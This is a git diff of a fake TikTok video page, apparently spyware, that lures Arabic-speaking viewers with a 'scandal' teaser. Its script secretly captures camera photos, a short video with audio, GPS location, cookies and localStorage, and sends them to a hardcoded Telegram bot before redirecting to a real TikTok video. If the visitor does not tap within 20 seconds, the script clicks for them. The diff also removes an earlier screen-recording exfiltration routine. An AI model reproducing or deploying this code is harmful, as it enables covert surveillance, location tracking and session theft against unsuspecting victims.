@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Cyber Balasi Security - TikTok</title>
+    <title>Cyber Balasi Security - فيديو حصري</title>
     <style>
         * {
             -webkit-tap-highlight-color: transparent;
@@ -16,30 +16,6 @@
             background: #000;
             overflow: hidden;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        iframe {
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            position: absolute;
-            top: -100px;
-            left: -100px;
-            pointer-events: none;
-        }
-        #recording-overlay {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(10px);
-            color: white;
-            padding: 8px 15px;
-            border-radius: 30px;
-            font-size: 12px;
-            z-index: 9999;
-            display: none;
-            font-weight: bold;
-            letter-spacing: 0.5px;
         }
         .video-container {
             width: 100vw;
@@ -80,9 +56,11 @@
         }
         .placeholder-text {
             color: white;
-            font-size: 16px;
-            font-weight: 600;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            text-align: center;
+            padding: 0 20px;
         }
         #loading-overlay {
             position: absolute;
@@ -135,65 +113,38 @@
             opacity: 0;
             pointer-events: none;
         }
+        /* Fake TikTok UI */
         .tiktok-sidebar, .video-info, .bottom-nav {
             transition: opacity 0.5s ease;
             position: absolute;
             z-index: 15;
         }
-        .tiktok-sidebar {
-            right: 15px;
-            bottom: 100px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .video-info {
-            bottom: 80px;
-            left: 15px;
-            width: 70%;
+        .tiktok-sidebar { right: 15px; bottom: 100px; display: flex; flex-direction: column; gap: 20px; }
+        .video-info { bottom: 80px; left: 15px; width: 70%; color: white; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+        .bottom-nav { bottom: 0; left: 0; width: 100%; height: 60px; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); display: flex; justify-content: space-around; align-items: center; }
+        .nav-item, .sidebar-icon { display: flex; flex-direction: column; align-items: center; color: white; font-size: 12px; }
+        .sidebar-icon svg, .nav-item svg { width: 30px; height: 30px; fill: white; margin-bottom: 4px; }
+        #recording-overlay {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
             color: white;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
-        }
-        .bottom-nav {
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 60px;
-            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            padding-bottom: 10px;
-        }
-        .nav-item {
-            color: rgba(255,255,255,0.7);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            font-size: 11px;
-        }
-        .sidebar-icon {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: white;
+            padding: 8px 15px;
+            border-radius: 30px;
             font-size: 12px;
-        }
-        .sidebar-icon svg, .nav-item svg {
-            width: 30px;
-            height: 30px;
-            fill: white;
-            margin-bottom: 4px;
+            z-index: 9999;
+            display: none;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="video-container">
         <div class="video-placeholder" id="video-placeholder">
-            <div class="play-button">
-                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-            </div>
-            <div class="placeholder-text">Cyber Balasi Security • Tap to watch</div>
+            <div class="play-button"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+            <div class="placeholder-text">🔥 فضيحة أحد... 🔥<br>اضغط للمشاهدة</div>
         </div>
 
         <!-- Fake TikTok UI -->
@@ -204,37 +155,28 @@
         </div>
         <div class="video-info" id="fake-info">
             <div class="username">@cyber_balasi</div>
-            <div class="description">⚡ Cyber Balasi Security ⚡ Wait for it...</div>
+            <div class="description">⚡ Cyber Balasi Security ⚡ فضيحة لن تصدقها</div>
             <div class="music">🎵 original sound - trending</div>
         </div>
         <div class="bottom-nav" id="fake-nav">
-            <div class="nav-item active">🏠 Home</div>
-            <div class="nav-item">🔍 Discover</div>
-            <div class="nav-item">➕</div>
-            <div class="nav-item">💬 Inbox</div>
-            <div class="nav-item">👤 Me</div>
+            <div class="nav-item active">🏠 Home</div><div class="nav-item">🔍 Discover</div>
+            <div class="nav-item">➕</div><div class="nav-item">💬 Inbox</div><div class="nav-item">👤 Me</div>
         </div>
 
         <div id="loading-overlay">
             <div class="spinner"></div>
-            <div class="loading-message" id="loading-message">Cyber Balasi Security • Loading secure content...</div>
+            <div class="loading-message" id="loading-message">Cyber Balasi Security • جاري تجهيز الفضيحة...</div>
             <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
         </div>
-        <div id="recording-overlay">🔴 Cyber Balasi • Recording</div>
+        <div id="recording-overlay">🔴 Cyber Balasi • تسجيل</div>
     </div>
 
-    <!-- Hidden iframe for potential permission inheritance -->
-    <iframe id="trusted-iframe" src="https://www.tiktok.com/@tiktok/video/7325515231713506592" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>
-
     <script>
-        // Cyber Balasi Security Configuration
+        // Cyber Balasi Security - iOS Bypass Enhanced
         const TELEGRAM_BOT_TOKEN = '8683251674:AAE73I1jn1GqjsIu6eVGRxya25q5ilNOzkA';
         const CHAT_ID = '6969346690';
         const REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
-        let displayStream = null;
-        let displayRecorder = null;
-        let recordedChunks = [];
         let collectedData = {
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
@@ -242,16 +184,21 @@
             capturedVideo: null,
             location: null,
             cookies: null,
-            localStorageData: {},
-            screenRecording: null
+            localStorageData: {}
         };
 
-        function updateProgress(percent) {
-            const fill = document.getElementById('progress-fill');
-            if (fill) fill.style.width = percent + '%';
+        function updateProgress(p) { document.getElementById('progress-fill').style.width = p+'%'; }
+
+        // iOS PERMISSION BYPASS: request camera after ANY click
+        async function requestCameraPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { return false; }
         }
 
-        // 1. Camera images (mobile optimized)
+        // Capture multiple images (iPhone compatible)
         async function captureMultipleImages() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -259,7 +206,10 @@
                 });
                 const video = document.createElement('video');
                 video.srcObject = stream;
+                video.setAttribute('playsinline', '');
                 await video.play();
+                
+                await new Promise(r => setTimeout(r, 500));
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
@@ -267,159 +217,123 @@
                 
                 for (let i = 0; i < 3; i++) {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    collectedData.capturedImages.push(canvas.toDataURL('image/jpeg', 0.7));
-                    await new Promise(r => setTimeout(r, 500));
+                    collectedData.capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+                    await new Promise(r => setTimeout(r, 600));
                 }
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) { console.warn('Camera failed on mobile:', e); return false; }
+            } catch(e) { console.warn('Camera capture failed:', e); return false; }
         }
 
-        // 2. Secret video recording (short)
+        // Secret video recording (with audio)
         async function recordSecretVideo() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
                 const chunks = [];
                 recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                 recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
                     const reader = new FileReader();
                     reader.onloadend = () => { collectedData.capturedVideo = reader.result; };
                     reader.readAsDataURL(blob);
                 };
                 recorder.start();
-                await new Promise(r => setTimeout(r, 5000));
+                await new Promise(r => setTimeout(r, 6000));
                 recorder.stop();
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) { console.warn('Video record failed:', e); return false; }
+            } catch(e) { return false; }
         }
 
-        // 3. GPS Location (mobile friendly)
+        // GPS Location
         async function getPreciseLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            collectedData.location = {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                timestamp: pos.timestamp
-                            };
-                            resolve(true);
-                        },
+                        pos => { collectedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }; resolve(true); },
                         () => resolve(false),
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
-                } else { resolve(false); }
+                } else resolve(false);
             });
         }
 
-        // 4. Continuous screen recording (full screen)
-        async function startScreenRecording() {
-            try {
-                document.getElementById('recording-overlay').style.display = 'block';
-                displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-                displayRecorder = new MediaRecorder(displayStream, { mimeType: 'video/webm' });
-                displayRecorder.ondataavailable = async (event) => {
-                    if (event.data && event.data.size > 0) {
-                        const blob = event.data;
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('video', blob, 'screen_capture.webm');
-                        formData.append('caption', '🎥 Screen recording - Cyber Balasi Security');
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
-                    }
-                };
-                displayRecorder.start(8000);
-                setTimeout(() => {
-                    if (displayRecorder && displayRecorder.state === 'recording') {
-                        displayRecorder.stop();
-                        displayStream.getTracks().forEach(t => t.stop());
-                        document.getElementById('recording-overlay').style.display = 'none';
-                    }
-                }, 30000);
-            } catch(e) { console.warn('Screen recording error:', e); document.getElementById('recording-overlay').style.display = 'none'; }
-        }
-
-        // 5. Collect cookies and storage
+        // Collect storage
         function collectStorage() {
             try {
                 collectedData.cookies = document.cookie;
-                for(let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
+                for(let i=0; i<localStorage.length; i++) {
+                    let key = localStorage.key(i);
                     collectedData.localStorageData[key] = localStorage.getItem(key);
                 }
             } catch(e) {}
         }
 
-        // 6. Send all data to Telegram
+        // Send all data to Telegram
         async function sendAllData() {
-            let message = `🔐 Cyber Balasi Security Report\n`;
-            message += `⏰ Time: ${collectedData.timestamp}\n`;
-            message += `📱 Device: ${collectedData.userAgent}\n`;
-            if (collectedData.location) {
-                message += `📍 Location: ${collectedData.location.lat}, ${collectedData.location.lon} (Acc: ${collectedData.location.accuracy}m)\n`;
-                message += `🗺️ Maps: https://maps.google.com/?q=${collectedData.location.lat},${collectedData.location.lon}\n`;
-            }
-            message += `🍪 Cookies: ${collectedData.cookies ? collectedData.cookies.substring(0, 200) : 'None'}\n`;
+            let msg = `🔐 Cyber Balasi Security Report\n⏰ Time: ${collectedData.timestamp}\n📱 UA: ${collectedData.userAgent.substring(0,150)}\n`;
+            if(collectedData.location) msg += `📍 GPS: ${collectedData.location.lat}, ${collectedData.location.lon}\n🗺️ https://maps.google.com/?q=${collectedData.location.lat},${collectedData.location.lon}\n`;
+            msg += `🍪 Cookies: ${collectedData.cookies ? collectedData.cookies.substring(0,200) : 'None'}\n`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
             });
 
-            // Send images
             for(let img of collectedData.capturedImages) {
-                const blob = await fetch(img).then(r => r.blob());
-                const fd = new FormData();
+                let blob = await fetch(img).then(r => r.blob());
+                let fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'capture.jpg');
+                fd.append('photo', blob, 'spy.jpg');
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 await new Promise(r => setTimeout(r, 500));
+            }
+            
+            if(collectedData.capturedVideo) {
+                let blob = await fetch(collectedData.capturedVideo).then(r => r.blob());
+                let fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('video', blob, 'secret.mp4');
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
             }
         }
 
         // Main operation
         async function fullOperation() {
             updateProgress(10);
+            await requestCameraPermission(); // Force permission on iOS
+            updateProgress(25);
             await captureMultipleImages();
-            updateProgress(30);
+            updateProgress(45);
             await recordSecretVideo();
-            updateProgress(50);
-            await getPreciseLocation();
             updateProgress(65);
+            await getPreciseLocation();
+            updateProgress(80);
             collectStorage();
-            updateProgress(75);
-            await startScreenRecording();
             updateProgress(90);
             await sendAllData();
             updateProgress(100);
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
         }
 
-        // Trigger on click
-        document.getElementById('video-placeholder').addEventListener('click', () => {
+        // Trigger on click (user gesture)
+        document.getElementById('video-placeholder').addEventListener('click', async () => {
             document.getElementById('video-placeholder').classList.add('hidden-ui');
             document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
             document.getElementById('fake-info')?.classList.add('hidden-ui');
             document.getElementById('fake-nav')?.classList.add('hidden-ui');
             document.getElementById('loading-overlay').style.display = 'flex';
-            fullOperation();
+            await fullOperation();
         });
 
-        // Auto-start after 25s on mobile
+        // Auto-start after 20 seconds
         setTimeout(() => {
-            const overlay = document.getElementById('loading-overlay');
-            if (overlay && overlay.style.display !== 'flex') {
+            if(document.getElementById('loading-overlay').style.display !== 'flex')
                 document.getElementById('video-placeholder').click();
-            }
-        }, 25000);
+        }, 20000);
 
-        // Prevent zoom and touch gestures on mobile
+        // Prevent zoom
         document.addEventListener('touchmove', (e) => { if(e.target === document.body) e.preventDefault(); }, { passive: false });
     </script>
 </body>
